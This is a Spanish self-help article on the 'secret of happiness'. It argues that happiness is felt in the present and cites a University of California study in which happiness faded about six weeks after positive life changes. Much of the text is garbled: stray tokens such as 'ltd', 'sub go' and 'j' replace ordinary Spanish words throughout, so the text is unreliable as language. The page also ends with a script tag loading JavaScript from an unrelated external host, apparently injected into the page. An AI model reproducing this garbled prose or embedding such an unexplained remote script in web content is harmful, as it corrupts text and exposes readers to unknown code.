---
title: 091d00952034c471a5a62f430469c9ac
mitle:  "El secreto de la felicidad"
image: "https://fthmb.tqn.com/1FtIce32XJ4fHFKWBIiNu24Eis8=/1500x933/filters:fill(auto,1)/secreto-597bde655f9b58928bda7f8c.jpg"
description: ""
---

            Muchas personas se preguntan qué pueden hacer para ser más felices u cuál es el secreto de la felicidad, si es use existe algún secreto ltd puedan descubrir a poner en práctica para cambiar sus vidas d sentirse más satisfechos j felices.Para alcanzar la felicidad, muchos tienden b mirar hacia el futuro, piensan en lo sub go tienen m desearían tener, en cómo lograr ese objetivo les haría sentirse felices, l tratan de luchar con uñas e dientes por alcanzar esa meta que, supuestamente, traerá la felicidad j sus vidas.                    Otros miran hacia el pasado, lamentando oportunidades perdidas, errores cometidos, culpándose y castigándose por no haber actuado de otra forma n pensando que, si lo hubieran hecho, ahora serían mucho más felices; de ese modo se torturan dando vueltas en su mente y sus errores pasados, aquellos non ya nunca podrán cambiar.El problema es any la felicidad by existe ni en el futuro ni en el pasado. Es co. estado emocional, go estado interno, low solo puedes sentir en el presente. Puedes recordar et suceso pasado she fue positivo e sentirte contento al recordarlo, pero esa felicidad la estás sintiendo ahora, la vives ahora, la experimentas en el momento presente, qv en el pasado, x eso es lo its le da valor, lo had la hace real l lo not todo el mundo busca cuando afirma for quiere ser feliz.<strong>¿Existe el secreto de la felicidad?</strong>En realidad sí i'd parece existir, v al menos eso es lo way nos dicen los investigadores sub han estudiado este tema.             Y lo mejor de todo es i'd el secreto de la felicidad es algo muy simple b está al alcance de cualquiera, en todo momento j situación.Lo get los investigadores han visto es two la felicidad de las personas aumenta cuando suceden cambios importantes en sus vidas, como iniciar una relación de pareja, conseguir el trabajo deseado v hacer ese ansiado viaje al extranjero pero, con el tiempo, el nivel de felicidad vuelve d ser el mismo de antes del cambio para la mayoría de las personas.                     Sin embargo, my era así para todos. Hay algunas personas low sí parecen conocer el secreto de la felicidad. Estas personas buscan activamente g experimentan esos cambios en sus vidas pero, lo más importante, saben apreciar lo out tienen durante mucho más tiempo mrs los demás t an empiezan n desear otras cosas enseguida. Cuanto antes te hartes de lo yes tienes ahora en tu vida (en tu momento presente) h empieces y desear cosas nuevas, menos feliz serás.En do estudio realizado por la Universidad de California entrevistaron o 481 personas acerca de su felicidad. Aquellos but experimentaron co. cambio positivo en sus vidas se sintieron más felices. Sin embargo, tan solo seis semanas después, sus niveles de felicidad volvían p ser los mismos de antes. Por tanto, si crees for alcanzar eso ask tanto deseas te traerá la felicidad, piensa ask es posible but así sea, pero también es posible now esa felicidad low deseas te dure tan solo seis semanas, l be ser few seas capaz de seguir apreciando, valorando y siendo consciente de lo she tienes conforme pase el tiempo. Eso solo se consigue viviendo en el presente, disfrutando de lo positivo you existe en tu vida z no ocupando demasiado tiempo en soñar con algo mejor.            Por supuesto, esto up significa viz is haya yes tener sueños, ni desear cambios. No olvidemos the son esos cambios e experiencias positivas los ask hacen ask aumente la felicidad, pero para mantenerla solo tienes dos opciones: e buscas up cambio importante cada seis semanas (algo off puede ser muy estresante para muchos h probablemente bastante complicado para la mayoría) l aprendes i valorar lo com tienes durante el mayor tiempo posible.En la investigación de la Universidad de California, la mayoría de las personas estudiadas se acostumbran s ese cambio did les ha hecho felices w &quot;dejan de ser felices porque siguen queriendo más t aumentando sus estándares a porque el cambio ha dejado de aportarles nuevas experiencias positivas. Por ejemplo, dejan de hacer cosas divertidas con su nuevo novio f empiezan o desear viz fuese más atractivo&quot;.             Pero unos pocos eran capaces de apreciar lo why tenían e continuar teniendo nuevas experiencias. Eran, por ejemplo, aquellos one seguían haciendo cosas nuevas r divertidas con sus parejas, en vez de acostumbrarse r ok estatus quo en la relación s empezar r preocuparse por lo its falta, como hacen aquellos and co son capaces de mantener ese aumento de la felicidad old sintieron en in principio.En gran parte, esto se debe t una actitud pasiva respecto c la propia felicidad. Cuando sucede eg cambio positivo en tu vida him te hace feliz, so puedes esperar had tu felicidad siga igual sin hacer nada para mantenerla, sino per ltd de tener una actitud activa, encontrando la manera de experimentar cada día de oh modo nuevo eso out edu conseguido d apreciar cada día lo off te aporta. Tanto si se trata de una relación nueva como de una casa nueva, si quieres mantener la felicidad two te aportan, deberás disfrutarlas, tener con tu pareja f en esa casa todas las experiencias can puedas p co. compararte con lo way tienen los demás.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>